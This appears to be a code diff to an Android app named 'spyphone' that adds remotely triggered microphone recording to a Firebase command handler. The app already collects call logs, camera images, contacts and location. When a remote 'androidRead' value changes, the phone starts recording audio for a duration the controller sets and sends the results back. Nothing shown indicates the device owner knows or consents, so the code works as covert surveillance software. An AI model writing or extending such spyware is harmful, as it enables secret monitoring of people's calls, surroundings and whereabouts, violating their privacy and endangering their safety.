@@ -22,6 +22,7 @@ import emit.esy.es.spyphone.services.CallLogService;
 import emit.esy.es.spyphone.services.CameraService;
 import emit.esy.es.spyphone.services.ContactsService;
 import emit.esy.es.spyphone.services.LocationService;
+import emit.esy.es.spyphone.services.MicrophoneService;
 
 /**
  * Created by Emil Makovac on 24/04/2015.
@@ -47,8 +48,7 @@ public class FirebaseUtil {
 
             @Override
             public void onSuccess(Map<String, Object> result) {
-                Log.d(LOG_TAG, "CreateUser SUCCESS");
-                Log.d(LOG_TAG, "CreateUser ID- " + result.get("uid").toString());
+                Log.d(LOG_TAG, "User created. ID - " + result.get("uid").toString());
                 id= result.get("uid").toString();
                 setOnline(id, false);
                 //authenticate user
@@ -70,7 +70,7 @@ public class FirebaseUtil {
             @Override
             public void onAuthenticated(AuthData authData) {
                 id = authData.getUid();
-                Log.d(LOG_TAG, "Authenticate user ID- " + id);
+                Log.d(LOG_TAG, "User " + id + " authenticated");
                 setUpChildRef();
             }
 
@@ -111,6 +111,10 @@ public class FirebaseUtil {
                 content = data.getStringArrayList("content");
                 mcontext.stopService(new Intent(mcontext, CameraService.class));
                 break;
+            case "mic":
+                content = data.getString("content");
+                mcontext.stopService(new Intent(mcontext, MicrophoneService.class));
+                break;
             case "cords":
                 content = data.getDoubleArray("content");
                 break;
@@ -143,11 +147,12 @@ public class FirebaseUtil {
 
             Log.d("ChildChanged", child);
 
+            Intent intent;
             //check if androidRead has changed
             if(child.equals("androidRead")){
+                Log.d(LOG_TAG, dataSnapshot.getValue().toString());
                 //check if androidRead has a string or a map of strings as a value
                 try{
-                    Intent intent;
                     //if is a string
                     String childValue = (String)dataSnapshot.getValue();
                     switch (childValue){
@@ -194,7 +199,10 @@ public class FirebaseUtil {
                             long duration = (long) childValue.get("secondParam");
                             Log.d(LOG_TAG, "Starting mic service with duration " + Long.toString(duration) + " sec");
                             //create intent to start microphone recording service with duration of recording
-
+                            intent = new Intent(mcontext, MicrophoneService.class);
+                            intent.putExtra("messenger", new Messenger(handler));
+                            intent.putExtra("duration", duration);
+                            mcontext.startService(intent);
                             setOnDefaultAndroidRead(dataSnapshot);
                             break;
                     }
@@ -223,11 +231,7 @@ public class FirebaseUtil {
     public void setUpChildRef() {
         Log.d(LOG_TAG, "setUpChildRef");
         if(id != null){
-
-            Log.d(LOG_TAG, "setUpChildRef - id: " + id);
-
             setOnline(id, true);
-
             userRef.addChildEventListener(cel);
 
         }
